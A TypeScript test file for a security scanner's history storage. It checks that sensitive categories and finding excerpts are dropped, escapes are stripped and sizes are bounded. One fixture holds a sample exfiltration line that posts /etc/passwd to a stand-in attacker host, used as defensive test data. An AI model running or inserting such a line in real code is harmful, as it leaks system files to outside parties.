import assert from "node:assert/strict";
import test from "node:test";

import { assertAppPreferenceValueSafe } from "../platform/database/privacy-guard.server.ts";
import {
  DESKTOP_HISTORY_KEY,
  projectDesktopSecurityHistory,
  projectSecurityScheduleRuntime,
  restoreDesktopSecurityHistory,
} from "./desktop-state-broker.server.ts";

function historyEntry(index: number, categories: Record<string, unknown> = {}) {
  return {
    id: `scan:${String(index).padStart(8, "0")}-0000-0000-0000-000000000000:skill-${index}`,
    scanId: `scan:${String(index).padStart(8, "0")}-0000-0000-0000-000000000000`,
    skillRef: `skill:${String(index).padStart(64, "0")}`,
    skillName: `skill-${index}`,
    mode: "full",
    trigger: "manual",
    locale: "zh-CN",
    status: "complete",
    startedAt: "2026-08-21T00:00:00.000Z",
    finishedAt: "2026-08-21T00:00:01.000Z",
    report: {
      status: "complete",
      mode: "full",
      verdict: "warn",
      riskScore: 10,
      rulesVersion: "rules",
      engineVersion: "engine",
      locale: "zh-CN",
      contentHash: String(index),
      scannedFiles: 1,
      threatLevel: "medium",
      categories,
    },
  };
}

test("security history projection drops privacy-sensitive category keys", () => {
  const projected = projectDesktopSecurityHistory([
    historyEntry(1, {
      secret_access: { count: 1 },
      sensitive_file_access: { count: 2 },
    }),
  ]) as readonly { report: { categories: unknown } }[];

  assert.deepEqual(projected[0]?.report.categories, {});
  assert.doesNotThrow(() =>
    assertAppPreferenceValueSafe(DESKTOP_HISTORY_KEY, projected),
  );
});

test("security history projection retains privacy-safe finding evidence", () => {
  const entry = historyEntry(2) as ReturnType<typeof historyEntry> & {
    report: Record<string, unknown>;
  };
  entry.report.findings = [
    {
      id: "HTTP_REQUEST:abc:2",
      kind: "data_exfiltration",
      severity: "low",
      source: "static",
      kindDisplay: "数据泄露",
      severityDisplay: "低危",
      ruleId: "HTTP_REQUEST",
      ruleName: "HTTP 请求库",
      message: "Python requests HTTP 请求",
      remediation: "确认请求目标安全性",
      weight: 10,
      cweId: "CWE-319",
      path: "scripts/exfil.py",
      line: 2,
      fileHash: "a".repeat(64),
      excerpt:
        'requests.post("https://evil.example/upload", data=open("/etc/passwd"))',
    },
  ];
  entry.report.branches = [{ name: "static", status: "complete" }];
  entry.report.summary = "扫描了 2 个文件，发现 1 个低危。";
  entry.report.tokenUsage = {
    status: "complete",
    requestCount: 2,
    reportedRequestCount: 2,
    inputTokens: 120,
    outputTokens: 30,
    totalTokens: 150,
    cachedInputTokens: 64,
    byModel: {
      "deepseek-chat": {
        status: "complete",
        requestCount: 2,
        reportedRequestCount: 2,
        inputTokens: 120,
        outputTokens: 30,
        totalTokens: 150,
        cachedInputTokens: 64,
      },
    },
    byBranch: {},
  };

  const projected = projectDesktopSecurityHistory([entry]) as readonly {
    report: {
      findings: readonly Record<string, unknown>[];
      branches: readonly Record<string, unknown>[];
      summary: string;
      usageAccounting: {
        totalUnits: number;
        models: readonly {
          label: string;
          usage: { totalUnits: number };
        }[];
      };
    };
  }[];

  assert.equal(projected[0]?.report.findings.length, 1);
  assert.equal(projected[0]?.report.findings[0]?.kind, "data_exfiltration");
  assert.equal(projected[0]?.report.findings[0]?.path, "scripts/exfil.py");
  assert.equal(projected[0]?.report.findings[0]?.line, 2);
  assert.equal(projected[0]?.report.findings[0]?.cweId, "CWE-319");
  assert.equal(projected[0]?.report.findings[0]?.fileHash, "a".repeat(64));
  assert.equal("excerpt" in (projected[0]?.report.findings[0] ?? {}), false);
  assert.deepEqual(projected[0]?.report.branches, [
    { name: "static", status: "complete" },
  ]);
  assert.match(projected[0]?.report.summary ?? "", /低危/u);
  assert.equal(projected[0]?.report.usageAccounting.totalUnits, 150);
  assert.equal(
    projected[0]?.report.usageAccounting.models[0]?.usage.totalUnits,
    150,
  );
  assert.doesNotThrow(() =>
    assertAppPreferenceValueSafe(DESKTOP_HISTORY_KEY, projected),
  );
  const restored = restoreDesktopSecurityHistory(projected);
  assert.equal(restored[0]?.report?.tokenUsage?.totalTokens, 150);
  assert.equal(
    restored[0]?.report?.tokenUsage?.byModel["deepseek-chat"]?.totalTokens,
    150,
  );
});

test("security history projection removes JSON escape characters before SQLite", () => {
  const entry = historyEntry(22) as ReturnType<typeof historyEntry> & {
    errorCode?: string;
    report: Record<string, unknown>;
  };
  entry.id = 'scan:"escape\\id"';
  entry.scanId = 'scan:"escape\\id"';
  entry.skillRef = 'skill:"escape\\ref"';
  entry.skillName = 'model "review"';
  entry.startedAt = "2026-09-03T00:00:00.000Z\\n";
  entry.errorCode = "security\\scanFailed";
  entry.report.summary = 'line one\nline two \\"quoted\\"';
  entry.report.rulesVersion = "rules\\version";
  entry.report.engineVersion = 'engine"version';
  entry.report.contentHash = "hash\\value";
  entry.report.findings = [
    {
      id: "finding-escape",
      kind: "data_exfiltration",
      severity: "low",
      source: "model",
      kindDisplay: "data exfiltration",
      severityDisplay: "low",
      ruleName: "quoted rule",
      message: 'line one\nline two "quoted"',
      remediation: "review",
      weight: 1,
      path: "scripts/example.py",
    },
  ];

  const projected = projectDesktopSecurityHistory([entry]);
  assert.equal(JSON.stringify(projected).includes("\\"), false);
  assert.doesNotThrow(() =>
    assertAppPreferenceValueSafe(DESKTOP_HISTORY_KEY, projected),
  );
});

test("security history projection retains the newest entries below the preference limit", () => {
  const projected = projectDesktopSecurityHistory(
    Array.from({ length: 200 }, (_, index) => historyEntry(index)),
  ) as readonly { skillName: string }[];

  assert.ok(projected.length < 200);
  assert.equal(projected[0]?.skillName, "skill-0");
  assert.equal(projected.at(-1)?.skillName, `skill-${projected.length - 1}`);
  assert.doesNotThrow(() =>
    assertAppPreferenceValueSafe(DESKTOP_HISTORY_KEY, projected),
  );
});

test("security history projection bounds a single noisy model report", () => {
  const entry = historyEntry(3) as ReturnType<typeof historyEntry> & {
    report: Record<string, unknown>;
  };
  entry.report.findings = Array.from({ length: 50 }, (_, index) => ({
    id: `finding-${index}`,
    kind: "data_exfiltration",
    severity: "low",
    source: "model",
    kindDisplay: "data exfiltration",
    severityDisplay: "low",
    ruleName: "r".repeat(240),
    message: "m".repeat(240),
    remediation: "x".repeat(240),
    weight: 1,
    path: "scripts/example.py",
    excerpt: "e".repeat(240),
    reasoning: "q".repeat(500),
  }));
  entry.report.skippedFiles = Array.from({ length: 500 }, () => ({
    path: "vendor/large-file.bin",
    reasonCode: "binary",
    reason: "s".repeat(240),
  }));

  const projected = projectDesktopSecurityHistory([entry]) as readonly {
    report: {
      findings: readonly unknown[];
      skippedFiles: readonly unknown[];
    };
  }[];
  const serialized = JSON.stringify(projected);
  assert.ok(serialized.length <= 60_000);
  assert.ok((projected[0]?.report.findings.length ?? 0) <= 50);
  assert.ok((projected[0]?.report.skippedFiles.length ?? 0) < 500);
  assert.doesNotThrow(() =>
    assertAppPreferenceValueSafe(DESKTOP_HISTORY_KEY, projected),
  );
});

test("scheduler runtime projection accepts only a hashed cursor and valid dates", () => {
  const runtime = {
    scheduleFingerprint: "a".repeat(64),
    nextRunAt: "2026-08-25T03:00:00.000Z",
    pending: true,
    updatedAt: "2026-08-25T02:00:00.000Z",
  };
  assert.deepEqual(projectSecurityScheduleRuntime(runtime), runtime);
  assert.throws(() =>
    projectSecurityScheduleRuntime({
      ...runtime,
      scheduleFingerprint: "/Users/private/skills",
    }),
  );
});
